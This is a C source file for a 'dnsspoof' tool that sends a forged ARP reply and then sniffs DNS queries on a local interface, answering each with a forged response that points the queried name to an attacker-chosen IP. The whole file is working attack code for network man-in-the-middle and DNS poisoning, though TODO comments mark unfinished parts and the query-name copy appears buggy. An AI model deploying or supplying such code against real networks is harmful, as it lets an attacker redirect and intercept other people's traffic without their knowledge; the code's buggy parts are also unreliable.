/*
 * Copyright (C) 2017 Jan Pawlak, Piotr Markowski
 *
 * Compilation:  make
 * Usage:        ./dnsspoof HOST INTERFACE
 * NOTE:         This program requires root privileges.
 *
 */

#include <libnet.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define ETH_ADDR_SIZE 6

void arp_spoof(char *host, char *interface){
  	libnet_t *ln;
	u_int32_t target_ip_addr, zero_ip_addr;
  	u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
           	zero_hw_addr[6]  = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  	struct libnet_ether_addr* src_hw_addr;
  	char errbuf[LIBNET_ERRBUF_SIZE];

  	if ((ln = libnet_init(LIBNET_LINK, interface, errbuf)) == NULL){
		printf("arp_spoof: error initializing libnet: %s\n", errbuf);
		exit(-1);
	}
  	if ((src_hw_addr = libnet_get_hwaddr(ln)) == NULL){
		printf("arp_spoof: failed to get MAC address\n");
		exit(-1);
	}
  	if ((target_ip_addr = libnet_name2addr4(ln, host, LIBNET_RESOLVE)) == -1){
		printf("arp_spoof: failed to get IPv4 address of HOST\n");
	}
  	zero_ip_addr = libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE);
  	libnet_autobuild_arp(
    		ARPOP_REPLY,                     /* operation type       */
    		src_hw_addr->ether_addr_octet,   /* sender hardware addr */
    		(u_int8_t*) &target_ip_addr,     /* sender protocol addr */	//TODO: check addr
    		zero_hw_addr,                    /* target hardware addr */
    		(u_int8_t*) &zero_ip_addr,       /* target protocol addr */
    		ln);                             /* libnet context       */
  	libnet_autobuild_ethernet(
    		bcast_hw_addr,                   /* ethernet destination */
    		ETHERTYPE_ARP,                   /* ethertype            */
   		ln);                             /* libnet context       */
  	libnet_write(ln);
	libnet_destroy(ln);
}

struct ethhdr{
	u_char eth_dst[ETH_ADDR_SIZE];
	u_char eth_src[ETH_ADDR_SIZE];
	u_short ether_type;
};

struct dnshdr{
	char id[2];
	char flags[2];
	char qdcount[2];
	char ancount[2];
	char nscount[2];
	char arcount[2];
};

struct dnsquery{
	char *qname;
	char qtype[2];
	char qclass[2];
};

struct net_addr{
	u_int32_t src_ip;
	u_int32_t dst_ip;
	u_int16_t port;
};

void process_dns_query(const u_char *packet, struct dnshdr **dns_hdr, struct dnsquery *dns_query, struct net_addr *naddr){
	struct ethhdr *eth;
	struct iphdr *ip;
	struct udphdr *udp;

	eth = (struct ethhdr*)(packet);
	ip = (struct iphdr*)(((char*) eth) + sizeof(struct ethhdr));
	naddr->src_ip = ip->saddr;
	naddr->dst_ip = ip->daddr;
	unsigned int ip_hdr_size = ip->ihl*4;
	udp = (struct udphdr *)(((char*) ip) + ip_hdr_size);
	naddr->port = ntohs(*(u_int16_t*)udp);

	*dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));
	dns_query->qname = ((char*) *dns_hdr) + sizeof(struct dnshdr);
}

unsigned int create_answer(char *host, struct dnshdr *dns_hdr, char* dns_answer, struct dnsquery *dns_query){
	unsigned char host_ip[4];
	unsigned int size = 0;

	sscanf(host, "%d.%d.%d.%d", (int *)&host_ip[0], (int *)&host_ip[1], (int *)&host_ip[2], (int *)&host_ip[3]);	//TODO: fix after arp_spoof address
	
	//header
	memcpy(&dns_answer[0], dns_hdr->id, 2);	//id
	memcpy(&dns_answer[2], "\x81\x80", 2);	//flags
	memcpy(&dns_answer[4], "\x00\x01", 2);	//qdcount
	memcpy(&dns_answer[6], "\x00\x01", 2);	//ancount
	memcpy(&dns_answer[8], "\x00\x00", 2);	//nscount
	memcpy(&dns_answer[10], "\x00\x00", 2);	//arcount
	//query
	size = strlen(dns_query->qname);
	memcpy(&dns_answer[12], dns_query, size);	//qname TODO: check this, size+1?
	size += 12;
	memcpy(&dns_answer[size], "\x00\x01", 2);	//type
	size += 2;
	memcpy(&dns_answer[size], "\x00\x01", 2);	//class
	size += 2;
	//answer
	memcpy(&dns_answer[size], "\xc0\x0c", 2);	//qname
	size += 2;
	memcpy(&dns_answer[size], "\x00\x01", 2);	//type
	size += 2;
	memcpy(&dns_answer[size], "\x00\x01", 2);	//class
	size += 2;
	memcpy(&dns_answer[size], "\x00\x00\x00\x22", 4);	//ttl
	size += 4;
	memcpy(&dns_answer[size], "\x00\x04", 2);	//rdata length
	size += 2;
	memcpy(&dns_answer[size], host_ip, 4);	//rdata
	size += 4;

	return size;
}

unsigned short calculate_checksum(unsigned short *buf, int nwords){
	unsigned long sum;
	for(sum = 0; nwords > 0; nwords--)
		sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return ~sum;
}

void build_datagram(char* datagram, unsigned int dns_size, struct net_addr naddr){
	struct ip *ip_hdr = (struct ip *) datagram;
	struct udphdr *udp_hdr = (struct udphdr *) (datagram + sizeof(struct ip));

	ip_hdr->ip_hl = 5;
	ip_hdr->ip_v = 4;
	ip_hdr-> ip_tos = 0;
	ip_hdr->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + dns_size;
	ip_hdr->ip_id = 0;
	ip_hdr->ip_off = 0;
	ip_hdr->ip_ttl = 255;
	ip_hdr->ip_p = 17;
	ip_hdr->ip_sum = 0;
	ip_hdr->ip_src.s_addr = naddr.dst_ip;
	ip_hdr->ip_dst.s_addr = naddr.src_ip;

	udp_hdr->source = htons(53);
	udp_hdr->dest = htons(naddr.port);
	udp_hdr->len = htons(sizeof(struct udphdr) + dns_size);
	udp_hdr->check = 0;

	ip_hdr->ip_sum = calculate_checksum((unsigned short *) datagram, ip_hdr->ip_len >> 1);
}

void send_answer(char* answer, struct net_addr naddr, unsigned int len){
	struct sockaddr_in saddr;
	int sfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	int on = 1;
	
	if (sfd < 0){
		printf("Error creating socket\n");
		exit(-1);
	}
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(naddr.port);
	saddr.sin_addr.s_addr = naddr.src_ip;
	
	if (setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, (char*) &on, sizeof(on)) < 0){
		printf("Error setting socket\n");
		exit(-1);
	}

	if (sendto(sfd, answer, len, 0, (struct sockaddr *)&saddr, sizeof(saddr)) < 0){
		printf("Error sending answer");
		exit(-1);
	}
}

void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes){
	printf("%dB of %dB\n", h->caplen, h-> len);
	
	struct dnshdr *dns_hdr;
	struct dnsquery dns_query;
	char udp_answer[8192];
	char* dns_answer;
	char* host;
	unsigned int answer_size;
	struct net_addr naddr;

	memset(&naddr, 0, sizeof(struct net_addr));

	process_dns_query(bytes, &dns_hdr, &dns_query, &naddr);
	printf("Captured query: %s\n", dns_query.qname);
	printf("src_ip: %d, dst_ip: %d, port: %d\n", naddr.src_ip, naddr.dst_ip, naddr.port);
	
	dns_answer = udp_answer + sizeof(struct ip) + sizeof(struct udphdr);
	host = (char*)user;
	answer_size = create_answer(host, dns_hdr, dns_answer, &dns_query);
	build_datagram(udp_answer, answer_size, naddr);
	answer_size += (sizeof(struct ip) + sizeof(struct udphdr));
	send_answer(udp_answer, naddr, answer_size);
}

void dns_spoof(char *host, char *interface){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle;
	char filter[32];
	struct bpf_program fp;

	memset(errbuf, 0, PCAP_ERRBUF_SIZE);
	if ((handle = pcap_open_live(interface, 1500, 1, 0, errbuf)) == NULL || strlen(errbuf) > 0){
		printf("dns_spoof: error initializing pcap: %s\n", errbuf);
		exit(-1);
	}

	sprintf(filter, "udp and dst port domain");	//Filter DNS queries

	if (pcap_compile(handle, &fp, filter, 0, 0) == -1){
		printf("dns_spoof: error compiling filter: %s\n", pcap_geterr(handle));
		exit(-1);
	}
	if (pcap_setfilter(handle, &fp) == -1){
		printf("dns_spoof: error setting filter: %s\n", pcap_geterr(handle));
	}
	
	pcap_loop(handle, -1, trap, (u_char*)host);
	
	pcap_freecode(&fp);
	pcap_close(handle);
}

int main(int argc, char** argv) {
  	if (argc < 3){
		printf("Usage: %s HOST INTERFACE\n", argv[0]);
		exit(-1);
	}
  	arp_spoof(argv[1], argv[2]);	//TODO: call in separate thread, infinite loop
	dns_spoof(argv[1], argv[2]);
	
  	return EXIT_SUCCESS;
}
